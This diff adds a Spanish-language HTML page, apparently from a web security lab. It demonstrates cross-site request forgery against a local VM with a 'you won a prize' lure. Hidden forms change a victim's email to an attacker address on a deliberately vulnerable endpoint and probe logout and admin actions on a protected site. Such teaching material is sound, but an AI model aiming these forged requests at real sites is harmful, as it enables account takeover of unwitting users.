@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<!--
+  Página "atacante" para demostrar CSRF (Fase 4).
+  Ábrela con doble clic (file://) en el mismo navegador donde visitaste el sitio.
+  Simula un sitio externo que envía formularios al servidor sin que la víctima lo note.
+-->
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>¡Ganaste un premio! (página atacante)</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 640px; margin: 2rem auto; padding: 0 1rem; }
+        input { width: 100%; padding: .5rem; }
+        button { margin-top: .75rem; padding: .6rem 1rem; cursor: pointer; }
+        .caja { border: 1px solid #ccc; border-radius: 8px; padding: 1rem; margin: 1rem 0; }
+    </style>
+</head>
+<body>
+<h1>🎁 ¡Ganaste un premio!</h1>
+<p>Página de demostración de un ataque CSRF.</p>
+
+<label for="base">URL del servidor (la IP de tu VM):</label>
+<input id="base" value="https://192.168.1.100">
+
+<div class="caja">
+    <h2>1. Contra el laboratorio vulnerable</h2>
+    <p>Cambia el correo de "maria" sin que ella lo sepa. Primero visita
+        <code>/laboratorio/cambiar_correo.php</code> en otra pestaña para tener sesión.</p>
+    <form id="ataque-lab" method="post" target="_blank">
+        <input type="hidden" name="correo" value="atacante@malicioso.com">
+        <button type="submit">Reclamar premio (ataque al laboratorio)</button>
+    </form>
+</div>
+
+<div class="caja">
+    <h2>2. Contra el sitio seguro</h2>
+    <p>Intenta cerrar la sesión y desbloquear cuentas sin token CSRF. Inicia sesión como admin
+        en otra pestaña antes de probar. Resultado esperado: <strong>403</strong> o redirección al login.</p>
+    <form id="ataque-logout" method="post" target="_blank">
+        <button type="submit">Ataque: cerrar sesión de la víctima</button>
+    </form>
+    <form id="ataque-admin" method="post" target="_blank">
+        <input type="hidden" name="id" value="1">
+        <button type="submit">Ataque: acción de administrador</button>
+    </form>
+</div>
+
+<script>
+    function actualizar() {
+        var base = document.getElementById('base').value.replace(/\/+$/, '');
+        document.getElementById('ataque-lab').action = base + '/laboratorio/cambiar_correo.php';
+        document.getElementById('ataque-logout').action = base + '/logout.php';
+        document.getElementById('ataque-admin').action = base + '/admin.php';
+    }
+    document.getElementById('base').addEventListener('input', actualizar);
+    actualizar();
+</script>
+</body>
+</html>
